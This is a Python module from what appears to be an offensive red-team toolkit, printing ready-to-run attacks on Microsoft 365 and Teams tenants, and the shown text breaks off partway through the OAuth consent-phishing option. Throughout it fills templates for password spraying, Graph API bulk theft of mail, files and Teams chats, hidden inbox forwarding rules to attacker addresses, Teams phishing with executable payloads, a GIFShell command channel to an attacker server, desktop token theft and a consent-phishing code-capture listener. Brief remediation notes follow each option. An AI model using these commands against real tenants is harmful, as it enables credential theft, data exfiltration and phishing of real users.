"""
Module: Microsoft 365 / Teams Application-Layer Attacks
Techniques: MailSniper · Graph API abuse · Teams phishing & message injection ·
            SharePoint/OneDrive data theft · Exchange Online abuse ·
            M365 app consent phishing · OAuth app abuse · Intune abuse
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("M365 / TEAMS ATTACKS", "Graph API · MailSniper · Teams Phishing · SharePoint")
    aad    = prompt("Tenant domain (e.g. corp.com / corp.onmicrosoft.com)")
    target = prompt("Target user UPN (e.g. victim@corp.com)")
    token  = prompt("Access token (or press Enter to skip — shown in commands)")

    _tok = token if token else "<access_token>"

    print(f"""
  {C}── EMAIL / EXCHANGE ONLINE ─────────────────────────────────────────{RST}
  [1]  MailSniper — Email Search & Harvest
  [2]  Global Address List Dump
  [3]  Exchange Online OWA Attacks
  {C}── GRAPH API ABUSE ──────────────────────────────────────────────────{RST}
  [4]  Graph API Recon & Enumeration
  [5]  Graph API Data Exfiltration
  [6]  Graph API Backdoor (app · delegate · mailbox)
  {C}── TEAMS ATTACKS ────────────────────────────────────────────────────{RST}
  [7]  Teams Phishing (GIFShell · message injection)
  [8]  Teams External Message Abuse
  [9]  Teams Token Theft
  {C}── SHAREPOINT / ONEDRIVE ────────────────────────────────────────────{RST}
  [10] SharePoint & OneDrive Data Theft
  {C}── APP CONSENT PHISHING ────────────────────────────────────────────{RST}
  [11] OAuth App Consent Phishing (illicit consent grant)
  [12] Intune / Endpoint Manager Abuse
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] MailSniper ────────────────────────────────────────────────────────────
    if c == "1":
        keyword = prompt("Search keyword (e.g. password, invoice, vpn, secret)") or "password"
        print(f"""
  {C}MailSniper — M365 Email Harvesting:{RST}

  {DIM}MailSniper searches Exchange Online mailboxes for sensitive content.
  Works with credentials or stolen access tokens.{RST}

  ── Install ────────────────────────────────────────────────────────────
  git clone https://github.com/dafthack/MailSniper
  Import-Module ./MailSniper.ps1

  ── Search own mailbox (with token) ───────────────────────────────────
  {Y}Invoke-SelfSearch (search victim's own mailbox):{RST}
  Invoke-SelfSearch -Folder all -SearchTerm "{keyword}" \\
    -ExchHostname outlook.office365.com \\
    -AccessToken '{_tok}'

  {Y}Search for credentials:{RST}
  $terms = @("password","creds","credential","vpn","secret","token","key","api")
  foreach ($t in $terms) {{
    Invoke-SelfSearch -Folder all -SearchTerm $t \\
      -AccessToken '{_tok}' -OutputCsv /tmp/mailsniper_$t.csv
  }}

  ── Admin search across all mailboxes ─────────────────────────────────
  {Y}Invoke-GlobalMailSearch (requires admin / EWS impersonation):{RST}
  Invoke-GlobalMailSearch -ImpersonationAccount {target} \\
    -ExchHostname outlook.office365.com \\
    -Folder all -SearchTerm "{keyword}" \\
    -AccessToken '{_tok}'

  ── Graph API mail search (no PowerShell needed) ──────────────────────
  {Y}Search mailbox via Graph:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/messages?\\$search=\\"{keyword}\\"&\\$select=subject,from,body,receivedDateTime" \\
    | python3 -m json.tool

  {Y}Get attachments (find credential docs):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/messages?\\$filter=hasAttachments eq true&\\$top=50" \\
    | python3 -c "
  import sys,json
  for m in json.load(sys.stdin).get('value',[]):
    print(m['subject'], '|', m['from']['emailAddress']['address'])
  "

  {Y}Download specific attachment:{RST}
  # Get message ID first, then:
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/messages/<message_id>/attachments" \\
    | python3 -m json.tool

  {DIM}High-value search terms: password, creds, vpn, mfa, secret, api, token,
  payroll, hr, salary, wire, invoice, bank, routing, ssn, dob, passport{RST}
""")
        add_finding("MailSniper M365 Email Harvesting", "High",
                    f"Mailbox of {target} searched for sensitive content via Graph API / MailSniper",
                    "Enable Microsoft Purview DLP; restrict EWS impersonation; monitor bulk email access via Defender for Cloud Apps")

    # ── [2] Global Address List Dump ─────────────────────────────────────────────
    elif c == "2":
        print(f"""
  {C}Global Address List (GAL) Dump — All M365 Users:{RST}

  {DIM}GAL contains all users, groups, distribution lists, contacts.
  Invaluable for phishing, spraying, and social engineering.{RST}

  ── MailSniper GAL ────────────────────────────────────────────────────
  {Y}PowerShell:{RST}
  Import-Module MailSniper
  Get-GlobalAddressList -ExchHostname outlook.office365.com \\
    -AccessToken '{_tok}' -OutFile /tmp/gal_users.txt
  # Output: all UPNs in tenant

  ── Graph API user enumeration ────────────────────────────────────────
  {Y}List all users (paged):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/users?\\$select=displayName,userPrincipalName,jobTitle,department,officeLocation&\\$top=999" \\
    | python3 -c "
  import sys,json
  data = json.load(sys.stdin)
  for u in data.get('value',[]):
    print(u.get('userPrincipalName',''), '|', u.get('jobTitle',''), '|', u.get('department',''))
  " > /tmp/all_users.txt

  {Y}Export with pagination (all users):{RST}
  python3 - << 'EOF'
  import requests, json

  url = "https://graph.microsoft.com/v1.0/users"
  params = {{"\\$select": "displayName,userPrincipalName,jobTitle,department,mobilePhone",
             "\\$top": "999"}}
  headers = {{"Authorization": "Bearer {_tok}"}}
  users = []

  while url:
      r = requests.get(url, headers=headers, params=params).json()
      users.extend(r.get("value", []))
      url = r.get("@odata.nextLink")
      params = {{}}  # nextLink already has params

  with open("/tmp/m365_users.json", "w") as f:
      json.dump(users, f, indent=2)
  print(f"[+] Exported {{len(users)}} users → /tmp/m365_users.json")
  EOF

  ── Groups & distribution lists ───────────────────────────────────────
  {Y}Get all groups:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/groups?\\$select=displayName,mail,groupTypes&\\$top=999" \\
    | python3 -m json.tool > /tmp/m365_groups.json

  {Y}Get group members:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/groups/<group_id>/members?\\$select=userPrincipalName,displayName"

  {DIM}Target: IT Admins, Finance, HR, Executive groups for follow-on phishing.
  Department/title data reveals org structure for BEC targeting.{RST}
""")
        add_finding("M365 GAL & User Enumeration via Graph API", "Medium",
                    f"Full tenant user list exported from {aad} via Microsoft Graph",
                    "Restrict user.Read.All scope; enable Graph API activity monitoring in Defender for Cloud Apps; limit GAL visibility for guests")

    # ── [3] Exchange Online OWA Attacks ──────────────────────────────────────────
    elif c == "3":
        print(f"""
  {C}Exchange Online / OWA Attack Techniques:{RST}

  ── OWA Password Spraying ─────────────────────────────────────────────
  {Y}Spray via EWS (no lockout on legacy auth — if not disabled):{RST}
  python3 ruler.py --domain {aad} --users /tmp/users.txt \\
    --password 'Winter2026!' spray --delay 60 --verbose

  {Y}MSOLSpray (M365 aware — checks lockout):{RST}
  python3 MSOLSpray.py --userlist /tmp/users.txt \\
    --password 'Winter2026!' --url https://login.microsoftonline.com/{aad}

  {Y}Spray via OWA endpoint (legacy auth):{RST}
  while read user; do
    code=$(curl -s -o /dev/null -w "%{{http_code}}" \\
      -u "$user:Winter2026!" \\
      "https://outlook.office365.com/EWS/Exchange.asmx")
    [ "$code" = "200" ] && echo "[+] VALID: $user"
  done < /tmp/users.txt

  ── Ruler — Exchange Rules & Forms ────────────────────────────────────
  {Y}Check for remote code execution via Exchange rules (Ruler):{RST}
  ruler --email {target} --password '<pass>' --url https://outlook.office365.com \\
    --verbose check

  {Y}Ruler — add malicious inbox rule (trigger on keyword):{RST}
  ruler --email {target} --password '<pass>' \\
    --url https://outlook.office365.com \\
    add --name "Security Update" \\
    --trigger "Security Update" \\
    --location "\\\\Server\\share\\payload.exe"

  {Y}Ruler — homoglyph / form attack (RCE via custom forms):{RST}
  ruler --email {target} --password '<pass>' form add \\
    --suffix test --input /tmp/evil_form.html \\
    --url https://outlook.office365.com

  ── Legacy protocol abuse ──────────────────────────────────────────────
  {Y}IMAP/POP3 — bypass MFA if legacy auth enabled:{RST}
  curl -v --ssl-reqd \\
    "imaps://outlook.office365.com:993" \\
    --user "{target}:<password>"

  {Y}SMTP AUTH — send as victim if legacy auth enabled:{RST}
  swaks --to target@corp.com --from {target} \\
    --server smtp.office365.com:587 --tls \\
    --auth-user {target} --auth-password '<pass>'

  {DIM}Legacy auth (IMAP/POP3/SMTP AUTH) bypasses MFA — disable in M365 admin.
  Ruler requires legacy EWS auth (often disabled in modern tenants).{RST}
""")
        add_finding("Exchange Online OWA & Legacy Protocol Abuse", "High",
                    f"Exchange Online legacy authentication or OWA spraying against {aad}",
                    "Disable legacy authentication protocols; enable Security Defaults or Conditional Access; block IMAP/POP3/SMTP AUTH via authentication policies")

    # ── [4] Graph API Recon ───────────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {C}Microsoft Graph API — Recon & Enumeration:{RST}

  {DIM}Graph API is the single interface to all M365 data.
  Even low-privilege users can enumerate vast amounts of org data.{RST}

  ── Identity recon ────────────────────────────────────────────────────
  {Y}Who am I:{RST}
  curl -H "Authorization: Bearer {_tok}" https://graph.microsoft.com/v1.0/me

  {Y}My group memberships:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    https://graph.microsoft.com/v1.0/me/memberOf | python3 -m json.tool

  {Y}My roles:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole

  ── Tenant enumeration ────────────────────────────────────────────────
  {Y}All admin roles + members:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/directoryRoles?\\$expand=members"

  {Y}Service principals (OAuth apps):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/servicePrincipals?\\$select=displayName,appId,oauth2PermissionScopes,appRoles" \\
    | python3 -m json.tool > /tmp/service_principals.json

  {Y}App registrations with high-privilege permissions:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/applications?\\$select=displayName,appId,requiredResourceAccess" \\
    | python3 -m json.tool

  ── ROADrecon — full automated Graph recon ────────────────────────────
  {Y}Install & run:{RST}
  pip3 install roadrecon
  roadrecon gather --access-token '{_tok}'
  roadrecon gui   # open browser at http://localhost:5000

  {Y}ROADtools — export specific data:{RST}
  roadrecon gather -t {aad} --tokens ~/.roadtools/token_cache.json
  roadrecon plugin bloodhound   # export to BloodHound format!

  ── Conditional Access enumeration ────────────────────────────────────
  {Y}List all CA policies (find gaps):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \\
    | python3 -c "
  import sys,json
  for p in json.load(sys.stdin).get('value',[]):
    state = p.get('state')
    excl  = p.get('conditions',{{}}).get('users',{{}}).get('excludeUsers',[])
    print(f'[{{state}}] {{p[\"displayName\"]}} | excludes {{len(excl)}} users')
  "
  # Excluded users = privileged targets (often break-glass accounts)

  {DIM}ROADrecon BloodHound export maps Azure AD privilege paths
  alongside on-prem AD — combined graph for full attack path analysis.{RST}
""")
        add_finding("Microsoft Graph API Tenant Recon", "Medium",
                    f"Tenant {aad} enumerated via Graph API — users, roles, apps, CA policies exposed",
                    "Implement Graph API throttling; monitor bulk API calls in Defender for Cloud Apps; restrict user.Read.All to admins")

    # ── [5] Graph API Data Exfiltration ──────────────────────────────────────────
    elif c == "5":
        out_dir = prompt("Output directory for exfiltrated data") or "/tmp/m365_exfil"
        print(f"""
  {C}Graph API Data Exfiltration:{RST}

  {DIM}With valid token: read emails, download files, export contacts, calendar.{RST}

  ── Setup output ──────────────────────────────────────────────────────
  mkdir -p {out_dir}/emails {out_dir}/files {out_dir}/teams

  ── Email exfiltration ────────────────────────────────────────────────
  {Y}Download all emails (paginated):{RST}
  python3 - << 'EOF'
  import requests, json, os

  headers = {{"Authorization": "Bearer {_tok}"}}
  url = "https://graph.microsoft.com/v1.0/me/messages"
  params = {{"\\$top": "50", "\\$select": "subject,from,body,receivedDateTime,hasAttachments"}}
  page = 0

  while url:
      r = requests.get(url, headers=headers, params=params).json()
      with open(f"{out_dir}/emails/page_{{page}}.json", "w") as f:
          json.dump(r.get("value", []), f, indent=2)
      url = r.get("@odata.nextLink")
      params = {{}}
      page += 1
  print(f"[+] Exported {{page}} pages → {out_dir}/emails/")
  EOF

  ── OneDrive / SharePoint file download ──────────────────────────────
  {Y}List OneDrive root:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/drive/root/children" \\
    | python3 -c "
  import sys,json
  for f in json.load(sys.stdin).get('value',[]):
    t = 'DIR' if 'folder' in f else 'FILE'
    print(f'[{{t}}] {{f[\"name\"]}} ({{f.get(\"size\",0)}} bytes)')
  "

  {Y}Download specific file:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/drive/root:/<path>:/content" \\
    -o {out_dir}/files/<filename>

  {Y}Recursive OneDrive download (Python):{RST}
  python3 - << 'EOF'
  import requests, os, json

  def dl_folder(folder_id, local_path, headers):
      os.makedirs(local_path, exist_ok=True)
      url = f"https://graph.microsoft.com/v1.0/me/drive/items/{{folder_id}}/children"
      items = requests.get(url, headers=headers).json().get("value", [])
      for item in items:
          if "folder" in item:
              dl_folder(item["id"], os.path.join(local_path, item["name"]), headers)
          else:
              dl_url = item.get("@microsoft.graph.downloadUrl")
              if dl_url:
                  with open(os.path.join(local_path, item["name"]), "wb") as f:
                      f.write(requests.get(dl_url).content)
                  print(f"[+] {{item['name']}}")

  h = {{"Authorization": "Bearer {_tok}"}}
  root = requests.get("https://graph.microsoft.com/v1.0/me/drive/root", headers=h).json()
  dl_folder(root["id"], "{out_dir}/files", h)
  EOF

  ── Teams chat history ────────────────────────────────────────────────
  {Y}Get all Teams chats:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/chats?\\$expand=members" \\
    | python3 -m json.tool > {out_dir}/teams/chats.json

  {Y}Get messages from chat:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/chats/<chat_id>/messages?\\$top=50" \\
    | python3 -m json.tool

  {DIM}Prioritize: Documents folder, Downloads, Desktop, HR/Finance shared drives.
  Teams chats often contain credentials, links, and sensitive business data.{RST}
""")
        add_finding("M365 Data Exfiltration via Graph API", "Critical",
                    f"Emails, OneDrive files, and Teams chats exfiltrated from {target} via Graph",
                    "Enable Microsoft Purview sensitivity labels; DLP policy for Graph API; Defender for Cloud Apps session policy for file downloads; monitor large Graph API data transfers")

    # ── [6] Graph API Backdoor ────────────────────────────────────────────────────
    elif c == "6":
        print(f"""
  {C}Graph API Backdoor Creation:{RST}

  {DIM}Create persistent access that survives password resets.{RST}

  ── Delegate mailbox access ───────────────────────────────────────────
  {Y}Grant attacker mailbox read access:{RST}
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/users/{target}/mailFolders/inbox/messages" \\
    --data '{{"forwardingAddress": "attacker@gmail.com"}}'

  {Y}Add mailbox delegate via PowerShell (Exchange Online):{RST}
  # Connect-ExchangeOnline -AccessToken <token>
  Add-MailboxPermission -Identity {target} \\
    -User attacker@{aad} -AccessRights FullAccess -AutoMapping $false

  ── Hidden inbox rule (survives password reset) ───────────────────────
  {Y}Create stealthy forward rule:{RST}
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \\
    -d '{{
      "displayName": "SyncRule",
      "sequence": 1,
      "isEnabled": true,
      "isReadOnly": false,
      "conditions": {{"bodyOrSubjectContains": []}},
      "actions": {{
        "forwardTo": [{{"emailAddress": {{"address": "attacker@protonmail.com"}}}}],
        "stopProcessingRules": false,
        "markAsRead": true
      }}
    }}'

  ── App with delegated Mail.Read permission ───────────────────────────
  {Y}Create app + get user consent (no admin required for delegated perms):{RST}
  # Register app in portal or via Graph
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/applications" \\
    -d '{{
      "displayName": "DiagnosticsMailer",
      "signInAudience": "AzureADMultipleOrgs",
      "requiredResourceAccess": [{{
        "resourceAppId": "00000003-0000-0000-c000-000000000000",
        "resourceAccess": [
          {{"id": "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", "type": "Scope"}},
          {{"id": "37f7f235-527c-4136-accd-4a02d197296e", "type": "Scope"}}
        ]
      }}]
    }}'
  # Scope IDs: Mail.Read + openid

  {DIM}Inbox rules survive password resets and MFA changes.
  App delegated access continues until user revokes in MyApps portal.{RST}
""")
        add_finding("Graph API Backdoor — Mailbox & App Registration", "Critical",
                    f"Persistent access planted in {target} mailbox and app registrations in {aad}",
                    "Audit inbox rules regularly; monitor new app registrations; alert on new mailbox delegation grants; use Microsoft Purview Insider Risk Management")

    # ── [7] Teams Phishing ────────────────────────────────────────────────────────
    elif c == "7":
        print(f"""
  {C}Microsoft Teams Phishing — GIFShell & Message Injection:{RST}

  {DIM}Teams is a highly trusted channel — phishing via Teams gets far higher
  click rates than email. External messaging is often enabled by default.{RST}

  ── GIFShell attack (command exfiltration via GIF) ────────────────────
  {Y}GIFShell — C2 over Teams GIF rendering:{RST}
  git clone https://github.com/bobbyrsec/Microsoft-Teams-GIFShell
  cd Microsoft-Teams-GIFShell

  # Step 1: Set up listener on attacker server
  python3 gifshell_c2.py --server {SESSION.get('dc_ip','<attacker_ip>')} --port 8080

  # Step 2: Create malicious GIF stager
  python3 create_stager.py \\
    --url "http://{SESSION.get('dc_ip','<attacker_ip>')}:8080" \\
    --output /tmp/payload.gif

  # Step 3: Send GIF to victim via Teams (external or internal)
  # Victim's client loads GIF → exfiltrates command output in URL

  {Y}TeamsPhisher — send messages/files to Teams users:{RST}
  git clone https://github.com/Octoberfest7/TeamsPhisher
  pip3 install -r requirements.txt

  # Enumerate external Teams users:
  python3 TeamsPhisher.py -M recon -u {target} -p '<pass>' \\
    --target external_victim@othercorp.com

  # Send Teams message with malicious attachment:
  python3 TeamsPhisher.py -M send \\
    -u {target} -p '<pass>' \\
    --target victim@othercorp.com \\
    --message "Urgent: Review attached security policy" \\
    --file /tmp/payload.exe

  ── Message injection via Graph API ──────────────────────────────────
  {Y}Send Teams message as logged-in user:{RST}
  # Get channel ID first:
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/me/joinedTeams" \\
    | python3 -c "
  import sys,json
  for t in json.load(sys.stdin).get('value',[]):
    print(t['id'], t['displayName'])
  "

  # Post message to channel:
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/teams/<team_id>/channels/<channel_id>/messages" \\
    -d '{{
      "body": {{
        "contentType": "html",
        "content": "<a href=\\"http://<attacker>/payload.exe\\">Security Policy Update - Action Required</a>"
      }}
    }}'

  {Y}Send direct chat message:{RST}
  # Create 1:1 chat:
  chat=$(curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/chats" \\
    -d '{{"chatType":"oneOnOne","members":[
      {{"@odata.type":"#microsoft.graph.aadUserConversationMember","roles":["owner"],"user@odata.bind":"https://graph.microsoft.com/v1.0/users/{target}"}},
      {{"@odata.type":"#microsoft.graph.aadUserConversationMember","roles":["owner"],"user@odata.bind":"https://graph.microsoft.com/v1.0/users/<attacker_upn>"}}
    ]}}' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

  # Send message:
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/chats/$chat/messages" \\
    -d '{{"body":{{"content":"Hey, please review this: http://<attacker>/payload"}}}}'

  {DIM}Teams messages bypass email filters and spam checks.
  Users inherently trust internal Teams messages more than email.{RST}
""")
        add_finding("Microsoft Teams Phishing / Message Injection", "High",
                    f"Teams messages used as phishing vector against {target} in {aad}",
                    "Restrict external Teams federation; disable unsafe file sharing; train users on Teams phishing; deploy Defender for Office 365 Safe Links in Teams")

    # ── [8] Teams External Message Abuse ─────────────────────────────────────────
    elif c == "8":
        ext_target = prompt("External target Teams UPN (victim@othercorp.com)")
        print(f"""
  {C}Teams External / Federation Abuse:{RST}

  {DIM}By default, Teams allows external users to message any tenant user.
  This enables direct phishing without any existing access.{RST}

  ── Check if target accepts external messages ──────────────────────────
  {Y}TeamsPhisher recon:{RST}
  python3 TeamsPhisher.py -M recon \\
    -u {target} -p '<password>' \\
    --target {ext_target}
  # Returns: "User found and Teams messages enabled" or "User not found"

  ── Mass recon of external targets ────────────────────────────────────
  {Y}Enumerate which corporate users accept external chats:{RST}
  while read ext_user; do
    result=$(python3 TeamsPhisher.py -M recon \\
      -u {target} -p '<pass>' --target "$ext_user" 2>&1)
    echo "$ext_user: $result"
  done < /tmp/external_targets.txt

  ── External phishing campaign ────────────────────────────────────────
  {Y}Send malicious file to external victim:{RST}
  python3 TeamsPhisher.py -M sendfile \\
    -u {target} -p '<pass>' \\
    --target {ext_target} \\
    --message "IT Security: Please install updated VPN client" \\
    --file /tmp/evil_vpn_installer.exe

  {Y}Send link to AiTM phishing page:{RST}
  python3 TeamsPhisher.py -M send \\
    -u {target} -p '<pass>' \\
    --target {ext_target} \\
    --message "Action required: https://login-corp-secure.com/reauth"

  ── Guest account abuse ───────────────────────────────────────────────
  {Y}Enumerate guest accounts in tenant:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/users?\\$filter=userType eq 'Guest'&\\$select=displayName,mail,userPrincipalName" \\
    | python3 -m json.tool

  {Y}Guest → internal pivot via Teams chat:{RST}
  # Compromise guest account → chat with internal users → phishing/social engineering
  # Guest can access: Teams channels invited to, shared files, @mentions

  {DIM}External message delivery doesn't require authentication from victim's side.
  Disable external access or restrict to specific domains in Teams admin center.{RST}
""")
        add_finding("Teams External Federation Abuse", "High",
                    f"External Teams federation exploited to phish {ext_target} from {aad} identity",
                    "Restrict Teams external access to approved domains only; disable external file sharing in Teams; monitor external message volume per user")

    # ── [9] Teams Token Theft ─────────────────────────────────────────────────────
    elif c == "9":
        print(f"""
  {C}Microsoft Teams Token Theft (Desktop Client):{RST}

  {DIM}Teams desktop client stores tokens in leveldb/localStorage — cleartext.
  Local access to victim machine → steal Teams token → Graph API access.{RST}

  ── Windows Teams token location ──────────────────────────────────────
  {Y}Teams Classic (electron app) token files:{RST}
  %APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\
  %APPDATA%\\Microsoft\\Teams\\Cookies
  %APPDATA%\\Microsoft\\Teams\\Network Persistent State

  {Y}Teams New (work/school) — MSAL token cache:{RST}
  %LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Local\\MicrosoftTeams\\
  # Also check: DPAPI-encrypted MSAL cache in:
  %APPDATA%\\Microsoft\\Protect\\

  ── Extract token (Stealthy local access) ────────────────────────────
  {Y}PowerShell — dump Teams auth token:{RST}
  # Teams Classic:
  $teamsPath = "$env:APPDATA\\Microsoft\\Teams\\Local Storage\\leveldb"
  Get-ChildItem $teamsPath -Filter "*.ldb" | ForEach-Object {{
    $content = [System.IO.File]::ReadAllText($_.FullName)
    if ($content -match 'authHeader|skypeToken|Bearer') {{
      Write-Output "[+] Token in: $($_.FullName)"
    }}
  }}

  {Y}Python extractor (from loot):{RST}
  python3 - << 'EOF'
  import glob, re

  paths = [
    "/home/*/.config/Microsoft/Microsoft Teams/Local Storage/leveldb/*.ldb",
    "/root/.config/Microsoft/Microsoft Teams/Local Storage/leveldb/*.ldb"
  ]

  token_re = re.compile(r'(eyJ[A-Za-z0-9_-]{{100,}}\\.eyJ[A-Za-z0-9_-]{{50,}}\\.[A-Za-z0-9_-]{{20,}})')

  for pattern in paths:
    for f in glob.glob(pattern):
      try:
        data = open(f, 'rb').read().decode('utf-8', errors='ignore')
        for t in token_re.findall(data):
          print(f"[+] JWT token found in {{f}}:")
          print(t[:80] + "...")
      except: pass
  EOF

  ── Validate and use stolen token ─────────────────────────────────────
  {Y}Validate token:{RST}
  curl -H "Authorization: Bearer <stolen_token>" \\
    https://graph.microsoft.com/v1.0/me

  {Y}Get Teams chats + messages:{RST}
  curl -H "Authorization: Bearer <stolen_token>" \\
    "https://graph.microsoft.com/v1.0/me/chats?\\$expand=members"

  {Y}Roadtx — refresh stolen Teams token:{RST}
  roadtx describe --token '<stolen_token>'
  # If refresh token also available:
  roadtx auth -t {aad} --refresh-token '<refresh_token>'

  {DIM}Teams tokens typically valid for 1 hour. Refresh tokens valid 90 days.
  LSASS dump → Teams DPAPI-protected tokens via SharpDPAPI/dploot.{RST}
""")
        add_finding("Teams Desktop Client Token Theft", "High",
                    f"Teams authentication tokens extracted from local storage on compromised host in {aad}",
                    "Deploy EDR to detect LevelDB/AppData read from non-Teams processes; rotate tokens via Entra ID; enable Continuous Access Evaluation")

    # ── [10] SharePoint / OneDrive ────────────────────────────────────────────────
    elif c == "10":
        print(f"""
  {C}SharePoint Online & OneDrive Data Theft:{RST}

  ── Enumerate SharePoint sites ────────────────────────────────────────
  {Y}List all SharePoint sites in tenant:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/sites?search=*" \\
    | python3 -c "
  import sys,json
  for s in json.load(sys.stdin).get('value',[]):
    print(s.get('webUrl'), '|', s.get('displayName'))
  " > /tmp/sharepoint_sites.txt

  {Y}Get site collections (admin token required):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://{aad.split('.')[0]}-admin.sharepoint.com/_api/web/webs" \\
    | python3 -m json.tool

  ── Browse & download SharePoint files ───────────────────────────────
  {Y}List drive items in a site:{RST}
  # Get site ID first from enumerate above
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/sites/<site_id>/drive/root/children"

  {Y}Spider SharePoint for sensitive files:{RST}
  python3 - << 'EOF'
  import requests, json

  headers = {{"Authorization": "Bearer {_tok}"}}
  sensitive = ["password","creds","vpn","secret","key","token","invoice","payroll","salary","ssn"]

  # Search across all SharePoint content
  for term in sensitive:
      url = f"https://graph.microsoft.com/v1.0/search/query"
      body = {{
          "requests": [{{
              "entityTypes": ["driveItem"],
              "query": {{"queryString": term}},
              "from": 0, "size": 25
          }}]
      }}
      r = requests.post(url, headers=headers, json=body).json()
      hits = r.get("value", [{{}}])[0].get("hitsContainers", [])
      for container in hits:
          for hit in container.get("hits", []):
              res = hit.get("resource", {{}})
              print(f"[{{term}}] {{res.get('name')}} — {{res.get('webUrl')}}")
  EOF

  {Y}Download SharePoint file directly:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/sites/<site_id>/drives/<drive_id>/items/<item_id>/content" \\
    -o /tmp/stolen_file.docx

  ── SharePoint SYSVOL equivalent — configuration files ───────────────
  {Y}Search for IT/DevOps SharePoint sites (goldmine):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/sites?search=IT" \\
    | python3 -c "import sys,json; [print(s['webUrl']) for s in json.load(sys.stdin).get('value',[])]"

  # Target sites: IT, DevOps, Engineering, Finance, HR, Legal

  {DIM}SharePoint often contains: network diagrams, credentials docs, runbooks,
  HR data, financial records, source code, VPN configs, and more.{RST}
""")
        add_finding("SharePoint / OneDrive Data Exfiltration", "High",
                    f"SharePoint sites in {aad} enumerated and files downloaded via Graph API",
                    "Apply sensitivity labels to SharePoint; DLP policy for SPO; monitor bulk downloads via Defender for Cloud Apps; restrict SharePoint external sharing")

    # ── [11] OAuth Consent Phishing ───────────────────────────────────────────────
    elif c == "11":
        print(f"""
  {C}OAuth App Consent Phishing (Illicit Consent Grant):{RST}

  {DIM}Trick victim into granting OAuth permissions to malicious app.
  No credentials stolen — victim clicks "Accept" → attacker has API access.
  Works even with MFA, Conditional Access, and strong passwords.{RST}

  ── Create malicious OAuth app ────────────────────────────────────────
  {Y}Register app in attacker's Azure tenant:{RST}
  # Azure Portal → App Registrations → New Registration
  # Name: "Teams File Sync" / "Microsoft Security Monitor"
  # Redirect URI: https://{SESSION.get('dc_ip','<attacker>')}:8443/callback

  # Request permissions (non-admin, user-approvable):
  # Mail.Read, Files.Read.All, User.Read, Contacts.Read, Team.ReadBasic.All

  {Y}Build consent URL:{RST}
  TENANT_ID="<victim_tenant_id>"
  CLIENT_ID="<your_malicious_app_id>"
  REDIRECT="https://<attacker>/callback"
  SCOPES="https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.Read.All https://graph.microsoft.com/User.Read offline_access"

  echo "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/authorize?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT&scope=$SCOPES&response_mode=query"

  ── Listener to capture auth code ─────────────────────────────────────
  {Y}Python listener:{RST}
  python3 - << 'EOF'
  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  import requests

  CLIENT_ID = "<malicious_app_id>"
  CLIENT_SECRET = "<app_secret>"
  REDIRECT = "https://<attacker>/callback"

  class H(BaseHTTPRequestHandler):
    def do_GET(self):
      params = parse_qs(urlparse(self.path).query)
      code = params.get("code", [""])[0]
      if code:
        print(f"[+] Auth code: {{code[:30]}}...")
        # Exchange for tokens
        r = requests.post(
          "https://login.microsoftonline.com/common/oauth2/v2.0/token",
          data={{"client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
                 "code": code, "redirect_uri": REDIRECT,
                 "grant_type": "authorization_code"}}
        )
        tokens = r.json()
